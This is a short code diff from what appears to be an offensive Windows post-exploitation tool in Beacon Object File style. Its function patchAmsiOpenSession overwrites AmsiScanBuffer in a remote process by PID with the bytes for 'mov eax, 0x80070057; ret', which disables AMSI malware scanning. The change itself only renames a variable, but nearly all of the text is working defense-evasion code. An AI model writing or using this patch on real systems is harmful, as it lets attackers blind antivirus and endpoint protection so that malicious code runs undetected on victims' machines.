@@ -40,9 +40,9 @@ void patchAmsiOpenSession(DWORD pid) {
 	hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
 	PVOID amsiScanBuffAddr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
 	unsigned char amsiScanBuffBypass[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
-	BOOL success1 = KERNEL32$WriteProcessMemory(hProc, amsiScanBuffAddr, (PVOID)amsiScanBuffBypass, sizeof(amsiScanBuffBypass), &bytes);
+	BOOL success = KERNEL32$WriteProcessMemory(hProc, amsiScanBuffAddr, (PVOID)amsiScanBuffBypass, sizeof(amsiScanBuffBypass), &bytes);
 	
-	if (!success1) {
+	if (!success) {
 		MSVCRT$printf("\nFail - Could not patch AmsiScanBuffer in remote process: PID:%d", pid);
 	}
 	KERNEL32$CloseHandle(hProc);
